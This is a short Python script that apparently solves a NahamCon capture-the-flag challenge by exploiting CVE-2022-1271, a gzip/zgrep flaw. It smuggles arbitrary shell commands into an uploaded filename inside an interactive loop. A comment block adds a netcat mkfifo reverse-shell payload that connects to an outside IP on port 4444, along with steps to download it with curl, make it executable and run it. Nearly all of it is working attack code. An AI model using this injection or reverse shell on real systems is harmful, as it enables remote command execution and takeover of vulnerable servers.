import requests
import re

url = "http://challenge.nahamcon.com:31285/"
while True:
    # CVE 2022-1271
    # ref: https://www.youtube.com/watch?v=k06ihMOM9VE
    # ref: https://www.openwall.com/lists/oss-security/2022/04/08/2
    command=input("-> ")
    filename=f"|\n;e {command}\n#.gz".encode()
    payload = {"action": "submit", "filename": filename, "contents": "Nice_Challenge!"}
    r=requests.post(url, data=payload)
    content=r.content.decode()
    content=re.findall(r'<pre>(.*)</pre>',content,re.DOTALL)[0]
    print(content)

# Contents of index.html
'''
#!/bin/sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 103.20.235.21 4444 >/tmp/f
'''
# order of commands
# ls -la
# curl ip:port > shell.sh  --> this will by default pull the index.html or index.php file
# chmod +x shell.sh
# sh shell.sh --> and viola! A Reverse Shell!!!
